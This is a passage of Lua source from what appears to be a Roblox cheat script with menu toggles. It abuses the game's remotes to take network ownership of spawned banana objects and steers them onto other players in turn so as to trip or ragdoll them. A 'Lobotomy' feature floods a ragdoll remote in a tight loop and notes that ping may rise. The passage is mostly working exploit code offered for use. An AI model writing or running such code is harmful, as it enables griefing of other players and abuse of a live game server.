			local v20 = nil

			for _, child in ipairs(currentBanana:GetChildren()) do
				if child:IsA("BasePart") then
					v20 = child
					break
				end
			end

			if not v20 then
				arg.isTakingOwnership = false
				return false
			end
			arg.originalPos = humanoidRootPart.CFrame
			humanoidRootPart.CFrame = v20.CFrame * cf3(0, -6, 0)
			task.wait(0.05)

			pcall(function()
				if ge and ge.CreateGrabLine then
					ge.CreateGrabLine:FireServer(v20, cf3(0, 9e9, 0))
				end

				if ge and ge.DestroyGrabLine then
					ge.DestroyGrabLine:FireServer(v20)
				end
			end)

			local flag7 = false
			local n26 = 0

			while not flag7 and n26 < 15 do
				for _, child in ipairs(currentBanana:GetChildren()) do
					if child:IsA("BasePart") then
						pcall(function()
							sno3:FireServer(child, child.CFrame)
						end)
					end
				end

				task.wait(0.05)
				n26 += 1

				for _, child in ipairs(currentBanana:GetChildren()) do
					if child:IsA("BasePart") then
						local partOwner = child:FindFirstChild("PartOwner")
						if partOwner and partOwner.Value == lp3.Name then
							flag7 = true
							break
						end
					end
				end
			end

			if not flag7 then
				arg.ownershipFailCount = arg.ownershipFailCount + 1

				if arg.originalPos then
					humanoidRootPart.CFrame = arg.originalPos
					humanoidRootPart.Velocity = v34(0, 0, 0)
					humanoidRootPart.AssemblyLinearVelocity = v34(0, 0, 0)
				end

				arg.isTakingOwnership = false
				arg.originalPos = nil

				if arg.ownershipFailCount >= 2 then
					fn23(arg)
					arg.ownershipFailCount = 0
				end

				return false
			end

			arg.bananaParts = {}

			for _, child in ipairs(currentBanana:GetChildren()) do
				if child:IsA("BasePart") then
					pcall(function()
						sno3:FireServer(child, child.CFrame)
						child.CanTouch = true
						child.CanCollide = true
						child.Anchored = false
						table.insert(arg.bananaParts, child)
					end)
				end
			end

			if arg.originalPos then
				humanoidRootPart.CFrame = arg.originalPos
				humanoidRootPart.Velocity = v34(0, 0, 0)
				humanoidRootPart.AssemblyLinearVelocity = v34(0, 0, 0)
			end

			arg.isTakingOwnership = false
			arg.originalPos = nil
			arg.ownershipFailCount = 0
			arg.currentBanana = currentBanana
			return true
		end

		local function fn27(arg)
			if not arg.currentBanana or not arg.currentBanana.Parent or #arg.bananaParts == 0 then
				return
			end
			local holdPosition = arg.holdPosition

			for _, bananaPart in ipairs(arg.bananaParts) do
				if bananaPart and bananaPart.Parent then
					pcall(function()
						local n26 = holdPosition - bananaPart.Position
						local magnitude = n26.Magnitude

						if magnitude > 10 then
							bananaPart.Position = holdPosition
							bananaPart.Velocity = v34(0, 0, 0)
							bananaPart.AssemblyLinearVelocity = v34(0, 0, 0)
						elseif magnitude > 0.01 then
							bananaPart.AssemblyLinearVelocity = n26.Unit * 100
							bananaPart.AssemblyAngularVelocity = v34(0, 0, 0)
						end
					end)
				end
			end
		end

		local function fn28(arg)
			if not arg then
				return nil
			end
			local leftLeg = arg:FindFirstChild("Left Leg")
			local rightLeg = arg:FindFirstChild("Right Leg")
			if not leftLeg or not rightLeg then
				return nil
			end

			if not leftLeg:IsA("BasePart") or not rightLeg:IsA("BasePart") then
				return nil
			end
			return (leftLeg.Position + rightLeg.Position) * 0.5
		end

		local function fn29(arg)
			if not arg then
				return v34(0, 0, 0)
			end
			local leftLeg = arg:FindFirstChild("Left Leg")
			local rightLeg = arg:FindFirstChild("Right Leg")
			if not leftLeg or not rightLeg then
				return v34(0, 0, 0)
			end

			if not leftLeg:IsA("BasePart") or not rightLeg:IsA("BasePart") then
				return v34(0, 0, 0)
			end
			return (leftLeg.AssemblyLinearVelocity + rightLeg.AssemblyLinearVelocity) * 0.5
		end

		local function fn30(arg, arg2, arg3)
			if not arg2 then
				return nil
			end
			local v20 = fn28(arg2)
			if not v20 then
				return nil
			end
			local now2 = tick()
			local v21 = fn29(arg2)

			if arg.lastTargetPos and arg.lastTargetTime then
				local n26 = now2 - arg.lastTargetTime

				if n26 > 0 and n26 < 0.5 then
					local targetVelocity = (v20 - arg.lastTargetPos) / n26

					if targetVelocity.Magnitude > 0.5 and targetVelocity.Magnitude < 200 then
						arg.targetVelocity = targetVelocity
					else
						arg.targetVelocity = v21
					end
				end
			else
				arg.targetVelocity = v21
			end

			arg.lastTargetPos = v20
			arg.lastTargetTime = now2

			if arg.targetVelocity.Magnitude > 0.2 then
				v20 += arg.targetVelocity * (math.min(arg3, 0.1) + 0.05)
			end

			return v20
		end

		local function fn31(arg)
			arg = arg and arg:FindFirstChild("Humanoid")
			arg = arg and arg:FindFirstChild("Ragdolled")
			return arg and arg.Value == true
		end

		local n26 = 1

		local function fn32(arg)
			if arg.currentTarget then
				tbl10[arg.currentTarget] = nil
				arg.currentTarget = nil
			end

			arg.currentTargetStart = 0
			arg.lastTargetPos = nil
			arg.lastTargetTime = nil
			arg.targetVelocity = v34(0, 0, 0)
		end

		local function fn33()
			local tbl11 = {}

			for _, player in ipairs(ps3:GetPlayers()) do
				if player ~= lp3 and player.Parent then
					local character = player.Character
					local humanoid = character and character:FindFirstChild("Humanoid")
					local leftLeg = character and character:FindFirstChild("Left Leg")
					local rightLeg = character and character:FindFirstChild("Right Leg")

					if humanoid and humanoid.Health > 0 and leftLeg and rightLeg and leftLeg:IsA("BasePart") and rightLeg:IsA("BasePart") and not fn31(character) and not humanoid.Sit then
						table.insert(tbl11, player)
					end
				end
			end

			table.sort(tbl11, function(arg, arg2)
				return arg.Name < arg2.Name
			end)

			if #tbl11 == 0 then
				return nil
			end
			local n27 = serverBanana.pickIndex % #tbl11 + 1

			for i = 0, #tbl11 - 1 do
				local pickIndex = (n27 + i - 1) % #tbl11 + 1
				local v20 = tbl11[pickIndex]

				if not tbl10[v20] then
					tbl10[v20] = true
					serverBanana.pickIndex = pickIndex
					return v20
				end
			end

			return nil
		end

		local function fn34(arg)
			if not arg.currentBanana or not arg.currentBanana.Parent or #arg.bananaParts == 0 or arg.isTakingOwnership then
				return
			end
			local now2 = tick()

			if now2 - arg.lastOwnershipCheck > 0.1 then
				arg.lastOwnershipCheck = now2

				if not fn21(arg.currentBanana) then
					for _, bananaPart in ipairs(arg.bananaParts) do
						if bananaPart and bananaPart.Parent then
							local partOwner = bananaPart:FindFirstChild("PartOwner")

							if partOwner and partOwner.Value ~= "" and partOwner.Value ~= lp3.Name then
								fn23(arg)
								fn32(arg)
								return
							end
						end
					end

					task.spawn(function()
						fn26(arg, arg.currentBanana)
					end)

					return
				end
			end

			fn17()
			local currentTarget_ = arg.currentTarget
			local flag7

			if not currentTarget_ or not currentTarget_.Parent then
				flag7 = true
			else
				local character = currentTarget_.Character
				local humanoid = character and character:FindFirstChild("Humanoid")
				local leftLeg = character and character:FindFirstChild("Left Leg")
				local rightLeg = character and character:FindFirstChild("Right Leg")
				local flag8 = not character or not humanoid or humanoid.Health <= 0 or not leftLeg or not rightLeg or not leftLeg:IsA("BasePart") or not rightLeg:IsA("BasePart") or fn31(character)
				flag7 = false

				if flag8 then
					flag7 = true
				end
			end

			if flag7 then
				fn32(arg)
				arg.currentTarget = fn33(arg)
				arg.currentTargetStart = tick()
				if not arg.currentTarget then
					fn27(arg)
					return
				end
			end

			if arg.currentTargetStart == 0 then
				arg.currentTargetStart = now2
			elseif n26 < now2 - arg.currentTargetStart then
				fn32(arg)
				arg.currentTarget = fn33(arg)
				arg.currentTargetStart = tick()
				if not arg.currentTarget then
					fn27(arg)
					return
				end
			end

			local character = arg.currentTarget.Character
			if not character then
				return
			end
			local leftLeg = character:FindFirstChild("Left Leg")
			local rightLeg = character:FindFirstChild("Right Leg")
			if not leftLeg or not rightLeg then
				fn32(arg)
				return
			end
			local v20 = fn30(arg, character, n25)
			if not v20 then
				return
			end
			local flag8 = now2 - arg.lastNetworkUpdate > 0.4

			for _, bananaPart in ipairs(arg.bananaParts) do
				if bananaPart and bananaPart.Parent then
					pcall(function()
						bananaPart.Position = v20
						bananaPart.AssemblyLinearVelocity = v34(0, 0, 0)
						bananaPart.AssemblyAngularVelocity = v34(0, 0, 0)

						if flag8 and ge and ge.DestroyGrabLine then
							ge.DestroyGrabLine:FireServer(bananaPart)
						end
					end)
				end
			end

			if flag8 then
				arg.lastNetworkUpdate = now2
			end
		end

		local function fn35(arg)
			for _, child in pairs(arg:GetChildren()) do
				if child.Name == "FoodBanana" and fn20(child) then
					return child
				end
			end

			return nil
		end

		local function fn36()
			local v20 = lp3
			local v21 = ws3:FindFirstChild(v20.Name .. "SpawnedInToys")
			if not v21 then
				return nil
			end
			local now2 = tick()

			while serverBanana.enabled and tick() - now2 < 10 do
				local v22 = fn35(v21)

				if v22 then
					for _, child in pairs(v21:GetChildren()) do
						if child ~= v22 and not fn24(child) and (child.Name == "FoodBanana" or child.Name == "BananaPeel") then
							pcall(function()
								if destroyRemote then
									destroyRemote:FireServer(child)
								end
							end)
						end
					end

					return v22
				end

				local canSpawnToy = lp3:FindFirstChild("CanSpawnToy")

				if canSpawnToy and canSpawnToy.Value then
					local character = v20.Character

					if character and character:FindFirstChild("HumanoidRootPart") then
						local humanoidRootPart = character.HumanoidRootPart
						local spawnToyRemoteFunction = repS.MenuToys.SpawnToyRemoteFunction

						task.spawn(function()
							pcall(function()
								spawnToyRemoteFunction:InvokeServer("FoodBanana", humanoidRootPart.CFrame * cf3(0, 12, 20), v34(0, 0, 0))
							end)
						end)
					end
				end

				task.wait(0.2)
			end

			return nil
		end

		local function fn37(arg)
			local character = lp3.Character
			if not character or not character:FindFirstChild("Humanoid") or character.Humanoid.Health <= 0 then
				return false
			end

			if not character:FindFirstChild("HumanoidRootPart") then
				return false
			end
			local v20 = fn36(arg)
			if not v20 then
				return false
			end
			local holdPart = v20:FindFirstChild("HoldPart")
			local holdItemRemoteFunction = holdPart and holdPart:FindFirstChild("HoldItemRemoteFunction")
			holdPart = holdPart and holdPart:FindFirstChild("DropItemRemoteFunction")
			if not holdItemRemoteFunction or not holdPart then
				return false
			end
			local flag7 = false

			task.spawn(function()
				pcall(function()
					arg.hasItem = holdItemRemoteFunction:InvokeServer(v20, character)

					if arg.hasItem then
						task.wait(0.1)
						fn18(v20)
						local now2 = tick()

						while fn20(v20) and serverBanana.enabled and tick() - now2 < 3 do
							task.wait(0.1)
						end

						pcall(function()
							local random = math.random
							holdPart:InvokeServer(v20, character, v34(math.random(100, 999), math.random(100, 999), random(100, 999)))
						end)

						arg.hasItem = false
						task.wait(0.1)

						if v20 and v20.Parent then
							arg.currentBanana = v20
							fn25(arg, v20)
							arg.lastOwnershipCheck = tick()
							arg.ownershipFailCount = 0
						end
					end
				end)

				flag7 = true
			end)

			local now2 = tick()

			while not flag7 and serverBanana.enabled and tick() - now2 < 8 do
				task.wait()
			end

			return arg.currentBanana ~= nil
		end

		local function fn38()
			serverBanana.enabled = true
			tbl10 = {}
			serverBanana.pickIndex = 0
			serverBanana.slots = {}

			for i = 1, serverBanana.bananaCount do
				table.insert(serverBanana.slots, fn22())
			end

			serverBanana.spawnThread = task.spawn(function()
				while serverBanana.enabled do
					local n27 = 0

					for _, player in ipairs(ps3:GetPlayers()) do
						if player ~= lp3 then
							n27 += 1
						end
					end

					local n28 = math.min(#serverBanana.slots, math.max(1, n27))

					for i, slot in ipairs(serverBanana.slots) do
						if i > n28 then
							if slot.currentBanana or slot.currentTarget then
								fn32(slot)
								fn23(slot)
							end
						else
							local flag7 = false

							if slot.currentBanana then
								if not slot.currentBanana.Parent then
									flag7 = true
								else
									local v20 = ws3:FindFirstChild(lp3.Name .. "SpawnedInToys")

									if v20 and not slot.currentBanana:IsDescendantOf(v20) then
										flag7 = true
									else
										flag7 = false

										if not fn21(slot.currentBanana) then
											local flag8 = false

											for _, child in ipairs(slot.currentBanana:GetChildren()) do
												if child:IsA("BasePart") then
													local partOwner = child:FindFirstChild("PartOwner")

													if partOwner and partOwner.Value ~= "" and partOwner.Value ~= lp3.Name then
														flag8 = true
														break
													else
														flag8 = false
													end
												else
													flag8 = false
												end
											end

											flag7 = false

											if flag8 then
												flag7 = true
											end
										end
									end
								end
							end

							if flag7 then
								fn32(slot)
								slot.currentBanana = nil
								slot.bananaParts = {}
								slot.hasItem = false
								slot.isTakingOwnership = false
								slot.originalPos = nil
								slot.ownershipFailCount = 0
							end

							if not slot.currentBanana and not slot.chainActive then
								slot.chainActive = true

								pcall(function()
									fn37(slot)
								end)

								slot.chainActive = false
							end
						end
					end

					task.wait()
				end
			end)

			serverBanana.moveThread = task.spawn(function()
				while serverBanana.enabled do
					for _, slot in ipairs(serverBanana.slots) do
						if slot.currentBanana and slot.currentBanana.Parent and #slot.bananaParts > 0 and not slot.isTakingOwnership then
							pcall(function()
								fn34(slot)
							end)
						end
					end

					task.wait()
				end
			end)
		end

		local function fn39()
			serverBanana.enabled = false

			for _, slot in ipairs(serverBanana.slots) do
				fn32(slot)
				fn23(slot)
			end

			serverBanana.slots = {}
			tbl10 = {}

			if serverBanana.spawnThread then
				task.cancel(serverBanana.spawnThread)
				serverBanana.spawnThread = nil
			end

			if serverBanana.moveThread then
				task.cancel(serverBanana.moveThread)
				serverBanana.moveThread = nil
			end

			fn19()
		end

		v19:CreateDropdown({ Name = "Method Loop [Server]", Items = { "Banana / peel" }, Default = "Banana / peel" })

		v19:CreateSlider({
			Name = "Object Count",
			Min = 1,
			Max = 5,
			Default = 1,
			Flag = "ServerBananaCount",
			Callback = function(arg)
				serverBanana.bananaCount = math.floor(arg + 0.5)

				if serverBanana.enabled then
					while serverBanana.bananaCount < #serverBanana.slots do
						local v20 = table.remove(serverBanana.slots)
						fn32(v20)
						fn23(v20)
					end

					while #serverBanana.slots < serverBanana.bananaCount do
						table.insert(serverBanana.slots, fn22())
					end
				end
			end,
		})

		v19:CreateToggle({
			Name = "Apply method server",
			Default = false,
			Callback = function(arg)
				if arg then
					fn38()
					playSound2(sounds2.Notify)
				else
					fn39()
				end
			end,
		})
	end

	do
		local v20 = _G.ServerTab:CreateBlock({ Name = "Lobotomy", Side = "Left", ImageID = "9158731033" })
		v20:CreateSection("To perform a lobotomy, you need")
		v20:CreateSection("to have Gucci activated!")
		_G.States = _G.States or {}
		_G.States.Lobotomy = { enabled = false, interval = 0.2, loopThread = nil }

		local function fn24()
			if _G.States.Lobotomy.loopThread then
				task.cancel(_G.States.Lobotomy.loopThread)
				_G.States.Lobotomy.loopThread = nil
			end

			_G.States.Lobotomy.enabled = false
		end

		local function fn25()
			_G.States.Lobotomy.enabled = true

			_G.States.Lobotomy.loopThread = task.spawn(function()
				while _G.States.Lobotomy.enabled do
					local lp4 = _G.LP or game:GetService("Players").LocalPlayer
					lp4 = lp4 and lp4.Character
					local humanoidRootPart = lp4 and lp4:FindFirstChild("HumanoidRootPart")
					local repS2 = _G.RepS or game:GetService("ReplicatedStorage")
					local ragdollRemote = repS2:FindFirstChild("RagdollRemote", true) or repS2:FindFirstChild("RagdollRemote")

					if humanoidRootPart and ragdollRemote then
						task.spawn(function()
							for i = 1, 25 do
								ragdollRemote:FireServer(humanoidRootPart, 0)
							end
						end)
					end

					task.wait(_G.States.Lobotomy.interval)
				end
			end)
		end

		v20:CreateSlider({
			Name = "Speed",
			Min = 0,
			Max = 0.05,
			Default = 0,
			DecimalPlaces = 3,
			Flag = "LobotomySpeedSlider",
			Callback = function(interval)
				_G.States.Lobotomy.interval = interval

				if _G.States.Lobotomy.enabled then
					fn24()
					fn25()
				end
			end,
		})

		v20:CreateToggle({
			Name = "Auto Lobotomy",
			Default = false,
			Callback = function(arg)
				if arg then
					fn25()
				else
					fn24()
				end
			end,
		})

		v20:CreateSection("Ping might go up!")
	end
